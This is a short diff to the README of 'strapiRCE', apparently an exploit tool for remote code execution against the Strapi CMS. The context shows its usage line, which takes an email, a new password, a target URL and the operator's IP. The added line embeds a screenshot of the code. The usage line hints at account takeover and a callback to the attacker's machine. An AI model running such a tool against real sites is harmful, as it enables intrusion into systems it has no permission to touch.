@@ -16,3 +16,4 @@ cd strapiRCE && chmod +x strapiRCE.py
 ```
 ./strapiRCE.py <EMAIL> <NEW_PASSWORD> <URL> <YOUR_IP>
 ```
+[![code](https://github.com/Invertebr4do/strapiRCE/blob/main/strapiRCE.png?raw=true "code")](https://github.com/Invertebr4do/strapiRCE/blob/main/strapiRCE.png?raw=true "code")
